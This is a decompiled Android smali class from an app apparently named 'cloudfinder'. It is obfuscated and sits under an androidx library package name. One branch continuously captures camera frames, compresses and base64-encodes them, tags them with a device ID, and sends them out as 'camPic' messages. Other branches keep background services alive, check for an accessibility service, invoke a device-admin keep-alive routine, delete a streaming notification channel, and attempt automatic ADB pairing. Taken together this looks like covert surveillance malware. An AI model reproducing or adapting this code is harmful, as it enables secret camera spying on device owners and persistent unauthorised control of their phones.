.class public final synthetic Landroidx/constraintlayout/helper/widget/؋;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field public final synthetic آ:I

.field public final synthetic أ:Ljava/lang/Object;


# direct methods
.method public synthetic constructor <init>(ILjava/lang/Object;)V
    .locals 0

    iput p1, p0, Landroidx/constraintlayout/helper/widget/؋;->آ:I

    iput-object p2, p0, Landroidx/constraintlayout/helper/widget/؋;->أ:Ljava/lang/Object;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 11

    iget v0, p0, Landroidx/constraintlayout/helper/widget/؋;->آ:I

    const/4 v1, 0x0

    const/4 v2, 0x1

    const/4 v3, 0x2

    const/4 v4, 0x0

    packed-switch v0, :pswitch_data_0

    :pswitch_0
    goto/16 :goto_9

    :pswitch_1
    iget-object v0, p0, Landroidx/constraintlayout/helper/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lcom/lite/cloudfinder/service/CameraService;

    :catch_0
    :goto_0
    iget-boolean v2, v0, Lcom/lite/cloudfinder/service/CameraService;->آ:Z

    if-eqz v2, :cond_8

    sget-object v2, Lcom/lite/cloudfinder/service/CameraService;->ب:Ljava/lang/Object;

    monitor-enter v2

    :try_start_0
    iget-object v5, v0, Lcom/lite/cloudfinder/service/CameraService;->ؤ:Ljava/util/ArrayList;

    invoke-virtual {v5}, Ljava/util/ArrayList;->isEmpty()Z

    move-result v5

    if-nez v5, :cond_0

    iget-object v5, v0, Lcom/lite/cloudfinder/service/CameraService;->ؤ:Ljava/util/ArrayList;

    invoke-virtual {v5, v4}, Ljava/util/ArrayList;->remove(I)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, [B

    move-object v6, v5

    goto :goto_1

    :cond_0
    move-object v6, v1

    :goto_1
    monitor-exit v2
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    if-nez v6, :cond_1

    const-wide/16 v5, 0xa

    :try_start_1
    invoke-static {v5, v6}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    :cond_1
    :try_start_2
    new-instance v2, Landroid/graphics/YuvImage;

    const/16 v7, 0x11

    iget v8, v0, Lcom/lite/cloudfinder/service/CameraService;->إ:I

    iget v9, v0, Lcom/lite/cloudfinder/service/CameraService;->ئ:I

    const/4 v10, 0x0

    move-object v5, v2

    invoke-direct/range {v5 .. v10}, Landroid/graphics/YuvImage;-><init>([BIII[I)V

    new-instance v5, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v5}, Ljava/io/ByteArrayOutputStream;-><init>()V

    new-instance v6, Landroid/graphics/Rect;

    iget v7, v0, Lcom/lite/cloudfinder/service/CameraService;->إ:I

    iget v8, v0, Lcom/lite/cloudfinder/service/CameraService;->ئ:I

    invoke-direct {v6, v4, v4, v7, v8}, Landroid/graphics/Rect;-><init>(IIII)V

    iget v7, v0, Lcom/lite/cloudfinder/service/CameraService;->ء:I

    invoke-virtual {v2, v6, v7, v5}, Landroid/graphics/YuvImage;->compressToJpeg(Landroid/graphics/Rect;ILjava/io/OutputStream;)Z

    invoke-virtual {v5}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v2

    array-length v5, v2

    const v6, 0xf000

    if-le v5, v6, :cond_2

    const/16 v5, 0xf

    iput v5, v0, Lcom/lite/cloudfinder/service/CameraService;->ء:I

    goto :goto_2

    :cond_2
    array-length v5, v2

    const v6, 0xc800

    if-le v5, v6, :cond_3

    const/16 v5, 0x19

    iput v5, v0, Lcom/lite/cloudfinder/service/CameraService;->ء:I

    goto :goto_2

    :cond_3
    array-length v5, v2

    const v6, 0xa000

    if-le v5, v6, :cond_4

    const/16 v5, 0x23

    iput v5, v0, Lcom/lite/cloudfinder/service/CameraService;->ء:I

    goto :goto_2

    :cond_4
    array-length v5, v2

    const/16 v6, 0x7800

    if-le v5, v6, :cond_5

    const/16 v5, 0x2d

    iput v5, v0, Lcom/lite/cloudfinder/service/CameraService;->ء:I

    goto :goto_2

    :cond_5
    array-length v5, v2

    const/16 v6, 0x5000

    if-le v5, v6, :cond_6

    const/16 v5, 0x41

    iput v5, v0, Lcom/lite/cloudfinder/service/CameraService;->ء:I

    goto :goto_2

    :cond_6
    const/16 v5, 0x4b

    iput v5, v0, Lcom/lite/cloudfinder/service/CameraService;->ء:I

    :goto_2
    invoke-static {v2, v3}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v2

    new-instance v5, Lorg/json/JSONObject;

    invoke-direct {v5}, Lorg/json/JSONObject;-><init>()V

    const-string v6, "img"

    invoke-virtual {v5, v6, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v2, "w"

    iget v6, v0, Lcom/lite/cloudfinder/service/CameraService;->إ:I

    invoke-virtual {v5, v2, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    const-string v2, "h"

    iget v6, v0, Lcom/lite/cloudfinder/service/CameraService;->ئ:I

    invoke-virtual {v5, v2, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    const-string v2, "deviceId"

    invoke-static {}, Lڜٟٱڀ/د;->ؠ()Lڜٟٱڀ/د;

    move-result-object v6

    iget-object v6, v6, Lڜٟٱڀ/د;->إ:Ljava/lang/String;

    invoke-virtual {v5, v2, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-static {}, Lڜٟٱڀ/د;->ؠ()Lڜٟٱڀ/د;

    move-result-object v2

    iget-object v2, v2, Lڜٟٱڀ/د;->آ:Lةؽڗںۍټ٘/ء;

    if-eqz v2, :cond_7

    const-string v6, "camPic"

    invoke-virtual {v2, v6, v5}, Lةؽڗںۍټ٘/ء;->آ(Ljava/lang/String;Lorg/json/JSONObject;)Z

    :cond_7
    const-wide/16 v5, 0x1

    invoke-static {v5, v6}, Ljava/lang/Thread;->sleep(J)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto/16 :goto_0

    :catch_1
    move-exception v2

    const-string v5, "CameraService"

    const-string v6, "Send frame error"

    invoke-static {v5, v6, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    iput-boolean v4, v0, Lcom/lite/cloudfinder/service/CameraService;->آ:Z

    goto/16 :goto_0

    :catchall_0
    move-exception v0

    :try_start_3
    monitor-exit v2
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    throw v0

    :cond_8
    return-void

    :pswitch_2
    iget-object v0, p0, Landroidx/constraintlayout/helper/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Landroid/app/NotificationManager;

    sget-boolean v1, Lcom/lite/cloudfinder/hd/HDStreamService;->ث:Z

    :try_start_4
    const-string v1, "hd_stream_sys"

    invoke-virtual {v0, v1}, Landroid/app/NotificationManager;->deleteNotificationChannel(Ljava/lang/String;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    :catch_2
    return-void

    :pswitch_3
    iget-object v0, p0, Landroidx/constraintlayout/helper/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lڙڧا/ء;

    iget-object v0, v0, Lڙڧا/ء;->آ:Ljava/lang/Object;

    check-cast v0, Lڝږ؁ڋ/ظ;

    invoke-virtual {v0}, Lڝږ؁ڋ/ظ;->ئ()V

    return-void

    :pswitch_4
    iget-object v0, p0, Landroidx/constraintlayout/helper/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lڝږ؁ڋ/س;

    iget-object v0, v0, Lڝږ؁ڋ/س;->ؠ:Lڝږ؁ڋ/ظ;

    invoke-virtual {v0}, Lڝږ؁ڋ/ظ;->ئ()V

    return-void

    :pswitch_5
    iget-object v0, p0, Landroidx/constraintlayout/helper/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lڝږ؁ڋ/ظ;

    invoke-virtual {v0}, Lڝږ؁ڋ/ظ;->ئ()V

    return-void

    :pswitch_6
    iget-object v0, p0, Landroidx/constraintlayout/helper/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lorg/json/JSONObject;

    invoke-static {v0}, Lڝږ؁ڋ/ر;->ء(Lorg/json/JSONObject;)V

    return-void

    :pswitch_7
    iget-object v0, p0, Landroidx/constraintlayout/helper/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lڝږ؁ڋ/ة;

    invoke-static {v0}, Lڗًقڔ/؋;->ټ(Lڝږ؁ڋ/ة;)V

    sget-boolean v0, Lڗًقڔ/؋;->ئ:Z

    if-nez v0, :cond_9

    goto :goto_3

    :cond_9
    sget-object v0, Lڗًقڔ/؋;->ج:Landroid/os/Handler;

    new-instance v1, Lةؽڗںۍټ٘/؋;

    const/16 v2, 0xd

    invoke-direct {v1, v2}, Lةؽڗںۍټ٘/؋;-><init>(I)V

    const-wide/16 v2, 0x5dc

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :goto_3
    return-void

    :pswitch_8
    iget-object v0, p0, Landroidx/constraintlayout/helper/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lڜٟٱڀ/ؤ;

    iget-boolean v1, v0, Lڜٟٱڀ/ؤ;->إ:Z

    if-eqz v1, :cond_a

    iget-boolean v1, v0, Lڜٟٱڀ/ؤ;->ؤ:Z

    if-eqz v1, :cond_a

    iget-object v1, v0, Lڜٟٱڀ/ؤ;->ء:Ljava/lang/String;

    if-eqz v1, :cond_a

    iget-object v0, v0, Lڜٟٱڀ/ؤ;->؋:Lڜٟٱڀ/ش;

    invoke-virtual {v0}, Lڜٟٱڀ/ش;->ؠ()V

    iget-object v1, v0, Lڜٟٱڀ/ش;->ؤ:Ljava/lang/String;

    if-eqz v1, :cond_a

    iget-object v2, v0, Lڜٟٱڀ/ش;->ئ:Ljava/lang/String;

    if-eqz v2, :cond_a

    iget v3, v0, Lڜٟٱڀ/ش;->إ:I

    invoke-virtual {v0, v1, v3, v2}, Lڜٟٱڀ/ش;->؋(Ljava/lang/String;ILjava/lang/String;)V

    :cond_a
    return-void

    :pswitch_9
    iget-object v0, p0, Landroidx/constraintlayout/helper/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lڜأِجطّثٮ/ء;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v1, "\u81ea\u52a8\u914d\u5bf9\u5931\u8d25: "

    :try_start_5
    invoke-virtual {v0}, Lڜأِجطّثٮ/ء;->أ()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3
    .catchall {:try_start_5 .. :try_end_5} :catchall_1

    goto :goto_4

    :catch_3
    move-exception v2

    :try_start_6
    const-string v3, "AdbPairMgr"

    const-string v5, "Auto pair failed"

    invoke-static {v3, v5, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    const-string v3, "error"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, " (\u53ef\u4f7f\u7528\u624b\u52a8\u6a21\u5f0f)"

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v3, v1}, Lڜأِجطّثٮ/ء;->ض(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_1

    :goto_4
    iput-boolean v4, v0, Lڜأِجطّثٮ/ء;->ؠ:Z

    return-void

    :catchall_1
    move-exception v1

    iput-boolean v4, v0, Lڜأِجطّثٮ/ء;->ؠ:Z

    throw v1

    :pswitch_a
    iget-object v0, p0, Landroidx/constraintlayout/helper/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lڛەٟہ/ب;

    iget-object v0, v0, Lڛەٟہ/ب;->ؠ:Landroid/app/Activity;

    :try_start_7
    invoke-virtual {v0}, Landroid/app/Activity;->isFinishing()Z

    move-result v1

    if-nez v1, :cond_b

    invoke-virtual {v0}, Landroid/app/Activity;->finishAndRemoveTask()V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_4

    goto :goto_5

    :catch_4
    :try_start_8
    invoke-virtual {v0}, Landroid/app/Activity;->finish()V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_5

    :catch_5
    :cond_b
    :goto_5
    return-void

    :pswitch_b
    iget-object v0, p0, Landroidx/constraintlayout/helper/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lcom/lite/cloudfinder/activity/MainActivity;

    sget-boolean v1, Lcom/lite/cloudfinder/activity/MainActivity;->آ:Z

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-class v1, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;

    :try_start_9
    invoke-virtual {v0}, Lcom/lite/cloudfinder/activity/MainActivity;->آ()Z

    move-result v2

    if-nez v2, :cond_c

    new-instance v2, Landroid/content/Intent;

    invoke-virtual {v0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-direct {v2, v3, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_6

    :catch_6
    :cond_c
    invoke-virtual {v0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "_pref"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2, v4}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    const-string v2, "accpage"

    const-string v3, ""

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-eqz v1, :cond_d

    sget-object v1, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    sget-object v1, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    if-eqz v1, :cond_d

    invoke-virtual {v0}, Lcom/lite/cloudfinder/activity/MainActivity;->إ()V

    :cond_d
    return-void

    :pswitch_c
    iget-object v0, p0, Landroidx/constraintlayout/helper/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lcom/lite/cloudfinder/activity/ConfirmDeviceActivity;

    sget v1, Lcom/lite/cloudfinder/activity/ConfirmDeviceActivity;->؋:I

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    :try_start_a
    invoke-virtual {v0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    new-instance v2, Landroid/content/Intent;

    const-class v3, Lcom/lite/cloudfinder/activity/ConfirmDeviceActivity;

    invoke-direct {v2, v1, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v3, 0x10010000

    invoke-virtual {v2, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_7

    goto :goto_6

    :catch_7
    move-exception v1

    const-string v2, "ConfirmDevice"

    const-string v3, "re-launch error"

    invoke-static {v2, v3, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_6
    invoke-virtual {v0}, Landroid/app/Activity;->finish()V

    return-void

    :pswitch_d
    iget-object v0, p0, Landroidx/constraintlayout/helper/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lژة۪ڦضۆۿۡ/ف;

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "Service took too long to process intent: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v3, v0, Lژة۪ڦضۆۿۡ/ف;->؋:Landroid/content/Intent;

    invoke-virtual {v3}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, " finishing."

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "FirebaseMessaging"

    invoke-static {v3, v2}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, v0, Lژة۪ڦضۆۿۡ/ف;->ؠ:Lؾپۑ۟ڂڷ/ا;

    invoke-virtual {v0, v1}, Lؾپۑ۟ڂڷ/ا;->ء(Ljava/lang/Object;)V

    return-void

    :pswitch_e
    iget-object v0, p0, Landroidx/constraintlayout/helper/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lذ٨ۍ/ر;

    iget-object v1, v0, Lذ٨ۍ/ر;->أ:Ljava/util/Collection;

    check-cast v1, Ljava/util/ArrayDeque;

    monitor-enter v1

    :try_start_b
    iget-object v2, v0, Lذ٨ۍ/ر;->ؠ:Ljava/lang/Object;

    check-cast v2, Landroid/content/SharedPreferences;

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    iget-object v3, v0, Lذ٨ۍ/ر;->ء:Ljava/lang/Object;

    check-cast v3, Ljava/lang/String;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v5, v0, Lذ٨ۍ/ر;->أ:Ljava/util/Collection;

    check-cast v5, Ljava/util/ArrayDeque;

    invoke-virtual {v5}, Ljava/util/ArrayDeque;->iterator()Ljava/util/Iterator;

    move-result-object v5

    :goto_7
    invoke-interface {v5}, Ljava/util/Iterator;->hasNext()Z

    move-result v6

    if-eqz v6, :cond_e

    invoke-interface {v5}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/lang/String;

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v6, v0, Lذ٨ۍ/ر;->آ:Ljava/lang/Object;

    check-cast v6, Ljava/lang/String;

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_7

    :cond_e
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-interface {v2, v3, v0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    monitor-exit v1

    return-void

    :catchall_2
    move-exception v0

    monitor-exit v1
    :try_end_b
    .catchall {:try_start_b .. :try_end_b} :catchall_2

    throw v0

    :pswitch_f
    iget-object v0, p0, Landroidx/constraintlayout/helper/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lږٍڔڴٝ/ء;

    sget-object v1, Lږٍڔڴٝ/ء;->ث:Ljava/lang/Object;

    invoke-virtual {v0, v4}, Lږٍڔڴٝ/ء;->؋(Z)V

    return-void

    :pswitch_10
    iget-object v0, p0, Landroidx/constraintlayout/helper/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lcom/google/android/material/textfield/TextInputLayout;

    iget-object v0, v0, Lcom/google/android/material/textfield/TextInputLayout;->آ:Landroid/widget/EditText;

    invoke-virtual {v0}, Landroid/view/View;->requestLayout()V

    return-void

    :pswitch_11
    iget-object v0, p0, Landroidx/constraintlayout/helper/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lٿخ۴۟ؽ/ة;

    iget-object v1, v0, Lٿخ۴۟ؽ/ة;->ئ:Landroid/widget/AutoCompleteTextView;

    invoke-virtual {v1}, Landroid/widget/AutoCompleteTextView;->isPopupShowing()Z

    move-result v1

    invoke-virtual {v0, v1}, Lٿخ۴۟ؽ/ة;->ز(Z)V

    iput-boolean v1, v0, Lٿخ۴۟ؽ/ة;->ث:Z

    return-void

    :pswitch_12
    iget-object v0, p0, Landroidx/constraintlayout/helper/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lٿخ۴۟ؽ/آ;

    invoke-virtual {v0, v2}, Lٿخ۴۟ؽ/آ;->ز(Z)V

    return-void

    :pswitch_13
    iget-object v0, p0, Landroidx/constraintlayout/helper/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lذ٨ۍ/ب;

    iput-boolean v4, v0, Lذ٨ۍ/ب;->ء:Z

    iget-object v1, v0, Lذ٨ۍ/ب;->ؠ:Ljava/lang/Object;

    check-cast v1, Lcom/google/android/material/sidesheet/SideSheetBehavior;

    iget-object v1, v1, Lcom/google/android/material/sidesheet/SideSheetBehavior;->ا:Landroidx/customview/widget/ViewDragHelper;

    if-eqz v1, :cond_f

    invoke-virtual {v1, v2}, Landroidx/customview/widget/ViewDragHelper;->continueSettling(Z)Z

    move-result v1

    if-eqz v1, :cond_f

    iget v1, v0, Lذ٨ۍ/ب;->آ:I

    invoke-virtual {v0, v1}, Lذ٨ۍ/ب;->؋(I)V

    goto :goto_8

    :cond_f
    iget-object v1, v0, Lذ٨ۍ/ب;->ؠ:Ljava/lang/Object;

    check-cast v1, Lcom/google/android/material/sidesheet/SideSheetBehavior;

    iget v2, v1, Lcom/google/android/material/sidesheet/SideSheetBehavior;->ئ:I

    if-ne v2, v3, :cond_10

    iget v0, v0, Lذ٨ۍ/ب;->آ:I

    invoke-virtual {v1, v0}, Lcom/google/android/material/sidesheet/SideSheetBehavior;->ء(I)V

    :cond_10
    :goto_8
    return-void

    :pswitch_14
    iget-object v0, p0, Landroidx/constraintlayout/helper/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lcom/google/android/material/carousel/CarouselLayoutManager;

    invoke-virtual {v0}, Lcom/google/android/material/carousel/CarouselLayoutManager;->ز()V

    return-void

    :pswitch_15
    iget-object v0, p0, Landroidx/constraintlayout/helper/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lةؽڗںۍټ٘/ج;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    new-instance v1, Landroidx/constraintlayout/core/state/؋;

    const/4 v2, 0x6

    invoke-direct {v1, v2, v0}, Landroidx/constraintlayout/core/state/؋;-><init>(ILjava/lang/Object;)V

    iget-object v0, v0, Lةؽڗںۍټ٘/ج;->آ:Lةڈۑۂٝےآذ/ء;

    check-cast v0, Lةٌخ/ة;

    invoke-virtual {v0, v1}, Lةٌخ/ة;->ؿ(Lةڈۑۂٝےآذ/ؠ;)Ljava/lang/Object;

    return-void

    :pswitch_16
    iget-object v0, p0, Landroidx/constraintlayout/helper/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lںڍڒڸ/ى;

    invoke-static {v0}, Landroidx/work/impl/workers/ConstraintTrackingWorker;->؋(Lںڍڒڸ/ى;)V

    return-void

    :pswitch_17
    iget-object v0, p0, Landroidx/constraintlayout/helper/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Landroidx/work/impl/workers/ConstraintTrackingWorker;

    invoke-static {v0}, Landroidx/work/impl/workers/ConstraintTrackingWorker;->ء(Landroidx/work/impl/workers/ConstraintTrackingWorker;)V

    return-void

    :pswitch_18
    iget-object v0, p0, Landroidx/constraintlayout/helper/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Landroidx/work/CoroutineWorker;

    invoke-static {v0}, Landroidx/work/CoroutineWorker;->؋(Landroidx/work/CoroutineWorker;)V

    return-void

    :pswitch_19
    iget-object v0, p0, Landroidx/constraintlayout/helper/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Landroidx/room/InvalidationTracker;

    invoke-virtual {v0}, Landroidx/room/InvalidationTracker;->onAutoCloseCallback$room_runtime_release()V

    return-void

    :pswitch_1a
    iget-object v0, p0, Landroidx/constraintlayout/helper/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Landroidx/constraintlayout/helper/widget/Carousel;

    invoke-static {v0}, Landroidx/constraintlayout/helper/widget/Carousel;->؋(Landroidx/constraintlayout/helper/widget/Carousel;)V

    return-void

    :goto_9
    iget-object v0, p0, Landroidx/constraintlayout/helper/widget/؋;->أ:Ljava/lang/Object;

    check-cast v0, Lژة۪ڦضۆۿۡ/ط;

    iget-object v0, v0, Lژة۪ڦضۆۿۡ/ط;->ؠ:Ljava/lang/Object;

    check-cast v0, Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive;

    invoke-static {v0}, Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive;->؋(Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive;)V

    return-void

    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_1a
        :pswitch_19
        :pswitch_18
        :pswitch_17
        :pswitch_16
        :pswitch_15
        :pswitch_14
        :pswitch_0
        :pswitch_13
        :pswitch_12
        :pswitch_11
        :pswitch_10
        :pswitch_f
        :pswitch_e
        :pswitch_d
        :pswitch_c
        :pswitch_b
        :pswitch_a
        :pswitch_9
        :pswitch_8
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
    .end packed-switch
.end method
